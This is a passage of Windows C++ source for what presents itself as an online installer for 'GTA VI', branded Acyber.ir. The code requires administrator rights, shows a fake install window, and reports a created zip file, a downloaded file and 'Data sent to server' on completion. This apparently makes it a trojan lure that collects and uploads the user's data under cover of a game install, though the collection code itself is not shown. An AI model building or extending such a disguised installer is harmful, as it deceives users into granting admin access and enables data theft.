        msgText += L"  - " + zipPath + L"\n";
    }
    if (downloadSuccess) {
        msgText += L"  - " + downloadPath + L"\n";
    }
    msgText += L"\nData sent to server: " + wstring(sent ? L"SUCCESS" : L"FAILED");
    
    MessageBoxW(
        g_hWnd,
        msgText.c_str(),
        L"Installation Complete",
        MB_OK | MB_ICONINFORMATION
    );
    
    EnableWindow(g_hButton, TRUE);
    EnableWindow(g_hCancelButton, FALSE);
    return 0;
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
        
    case WM_COMMAND:
        if (LOWORD(wParam) == 1) {
            // Install button
            EnableWindow(GetDlgItem(hWnd, 1), FALSE);
            CreateThread(NULL, 0, InstallThread, NULL, 0, NULL);
        }
        else if (LOWORD(wParam) == 2) {
            // Cancel button - close application
            SendMessageW(hWnd, WM_CLOSE, 0, 0);
        }
        break;
    }
    
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// Show permission error
void ShowPermissionError() {
    MessageBoxW(
        NULL,
        L"Please run as administrator to install GTA VI\n\nRight-click the program and select 'Run as administrator'",
        L"Permission Error",
        MB_OK | MB_ICONERROR | MB_SYSTEMMODAL
    );
    exit(1);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsAdmin()) {
        ShowPermissionError();
        return 1;
    }
    
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);
    
    const wchar_t CLASS_NAME[] = L"GTA6InstallerWindow";
    
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIconW(hInstance, MAKEINTRESOURCEW(1)); // Load icon from resources
    
    RegisterClassW(&wc);
    
    g_hWnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"Install Online GTA VI 😎 [Acyber.ir]",
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
        NULL, NULL, hInstance, NULL
    );
    
    if (g_hWnd == NULL) {
        return 0;
    }
    
    // Title
    CreateWindowExW(
        0,
        L"STATIC", L"Install Online GTA VI 😎 [Acyber.ir]",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        20, 10, 440, 30,
        g_hWnd, NULL, hInstance, NULL
    );
    
    // ListBox for installation steps
    g_hListBox = CreateWindowExW(
        WS_EX_CLIENTEDGE,
        L"LISTBOX", NULL,
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | LBS_NOTIFY,
        20, 50, 440, 200,
        g_hWnd, NULL, hInstance, NULL
    );
    
    // Progress bar
    g_hProgress = CreateWindowExW(
        0,
        PROGRESS_CLASSW, NULL,
        WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
        20, 270, 440, 30,
        g_hWnd, NULL, hInstance, NULL
    );
    SendMessageW(g_hProgress, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    
    // Status text
    g_hStatus = CreateWindowExW(
        0,
        L"STATIC", L"Ready to download and install...",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        20, 310, 440, 40,
        g_hWnd, NULL, hInstance, NULL
    );
    
    // Install button
    g_hButton = CreateWindowExW(
        0,
        L"BUTTON", L"Download and Install",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        100, 370, 180, 40,
        g_hWnd, (HMENU)1, hInstance, NULL
    );
    
    // Cancel button
    g_hCancelButton = CreateWindowExW(
        0,
        L"BUTTON", L"Cancel",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        300, 370, 100, 40,
        g_hWnd, (HMENU)2, hInstance, NULL
    );
    
    // Initialize the listbox with steps
    UpdateInstallSteps(0);
    
    ShowWindow(g_hWnd, nCmdShow);
    UpdateWindow(g_hWnd);
    
    MSG msg = {};
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}